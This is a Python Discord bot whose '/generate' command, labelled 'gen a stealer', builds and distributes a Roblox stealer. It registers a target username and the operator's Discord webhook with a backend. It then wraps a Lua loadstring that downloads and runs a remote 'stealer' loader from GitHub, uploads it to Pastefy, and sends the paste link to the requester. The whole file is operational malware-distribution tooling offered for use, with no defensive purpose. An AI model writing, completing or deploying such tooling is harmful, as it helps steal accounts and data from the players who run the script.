import os
import time
import discord
from discord import app_commands
from discord.ext import commands
import httpx
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.environ["DISCORD_BOT_TOKEN"]
PROTECTOR_URL = os.environ["PROTECTOR_URL"].rstrip("/")
ADMIN_SECRET = os.environ["ADMIN_SECRET"]
PASTEFY_TOKEN = os.environ["PASTEFY_TOKEN"]
ALLOWED_GUILD_ID = int(os.environ.get("ALLOWED_GUILD_ID", "0"))

ROBLOX_USERS_URL = "https://users.roblox.com/v1/users/search"
PASTEFY_API_URL = "https://pastefy.app/api/v2"
CACHE_TTL = 60
_username_cache = {}

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree


async def verify_roblox_username(username: str) -> tuple[bool, str]:
    key = username.lower()
    now = time.time()
    if key in _username_cache:
        expiry, exists = _username_cache[key]
        if now < expiry:
            if exists:
                return True, "ok"
            else:
                return False, "invalid usn"

    try:
        async with httpx.AsyncClient(timeout=5) as client:
            resp = await client.get(
                ROBLOX_USERS_URL,
                params={"keyword": username, "limit": 10}
            )
    except httpx.RequestError as e:
        print(f"Roblox users API unreachable: {e} — failing open")
        return True, "ok"

    if resp.status_code != 200:
        print(f"Roblox users API returned {resp.status_code} — failing open")
        return True, "ok"

    data = resp.json()
    names = [u.get("name", "").lower() for u in data.get("data", [])]
    exists = username.lower() in names

    _username_cache[key] = (now + CACHE_TTL, exists)

    if not exists:
        return False, "invalid usn"
    return True, "ok"


async def create_pastefy_paste(title: str, content: str) -> str | None:
    try:
        async with httpx.AsyncClient(timeout=15) as client:
            resp = await client.post(
                f"{PASTEFY_API_URL}/paste",
                headers={"Authorization": f"Bearer {PASTEFY_TOKEN}"},
                json={"title": title, "content": content}
            )
    except httpx.RequestError as e:
        print(f"Pastefy API unreachable: {e}")
        return None

    if resp.status_code not in (200, 201):
        print(f"Pastefy API returned {resp.status_code}: {resp.text[:200]}")
        return None

    data = resp.json()

    paste_id = data.get("id")
    if paste_id:
        return f"https://pastefy.app/{paste_id}/raw"

    return data.get("url") or data.get("link") or data.get("raw")


@bot.event
async def on_ready():
    if ALLOWED_GUILD_ID:
        guild = discord.Object(id=ALLOWED_GUILD_ID)
        tree.copy_global_to(guild=guild)
        await tree.sync(guild=guild)
    else:
        await tree.sync()
    print(f"Logged in as {bot.user} | Synced commands")


@tree.command(name="generate", description="gen a stealer")
@app_commands.describe(
    username="rpoblox user",
    webhook="webhook",
)
async def generate(interaction: discord.Interaction, username: str, webhook: str):
    await interaction.response.defer(ephemeral=True)

    if "discord.com/api/webhooks/" not in webhook and "discordapp.com/api/webhooks/" not in webhook:
        await interaction.followup.send("error not from us", ephemeral=True)
        return

    valid, reason = await verify_roblox_username(username)
    if not valid:
        await interaction.followup.send("error not from us", ephemeral=True)
        return

    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.post(
                f"{PROTECTOR_URL}/api/v3/token/register",
                json={"webhook_url": webhook, "username": username},
                headers={"x-admin-secret": ADMIN_SECRET},
            )
    except httpx.RequestError as e:
        await interaction.followup.send("error from us contact temphor pls", ephemeral=True)
        return

    if resp.status_code != 200:
        await interaction.followup.send("error from us contact temphor pls", ephemeral=True)
        return

    data = resp.json()
    token = data.get("token", "unknown")

    lua_script = f'''user = "{username}"
id = "{token}"
loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/loader", true))()'''

    paste_url = await create_pastefy_paste(f"Horizon_{username}", lua_script)

    if paste_url:
        loadstring_line = f'loadstring(game:HttpGet("{paste_url}", true))()'

        embed = discord.Embed(
            title="Token Generated",
            description="to stealer twin",
            color=0x57F287,
        )
        embed.add_field(name="Username", value=f"`{username}`", inline=True)
        embed.add_field(name="Token", value=f"`{token}`", inline=True)
        embed.add_field(
            name="Loadstring",
            value=f"```lua\n{loadstring_line}\n```",
            inline=False
        )
        embed.set_footer(text="Horizon Scripts | Best Script Services")

        await interaction.followup.send(embed=embed, ephemeral=True)

        try:
            dm_embed = discord.Embed(
                title="Your Horizon Script",
                description="Run this loadstring in your executor:",
                color=0x57F287,
            )
            dm_embed.add_field(
                name="Loadstring",
                value=f"```lua\n{loadstring_line}\n```",
                inline=False
            )
            dm_embed.set_footer(text="Horizon Scripts | Best Script Services")
            await interaction.user.send(embed=dm_embed)
        except discord.Forbidden:
            await interaction.followup.send("error not from us", ephemeral=True)
    else:
        embed = discord.Embed(
            title="Token Generated",
            description="yo stealer twin",
            color=0x57F287,
        )
        embed.add_field(name="Username", value=f"`{username}`", inline=True)
        embed.add_field(name="Token", value=f"`{token}`", inline=True)
        embed.add_field(
            name="Lua Script",
            value=f"```lua\n{lua_script}\n```",
            inline=False
        )
        embed.set_footer(text="Horizon Scripts | Best Script Services")

        await interaction.followup.send(embed=embed, ephemeral=True)


bot.run(BOT_TOKEN)
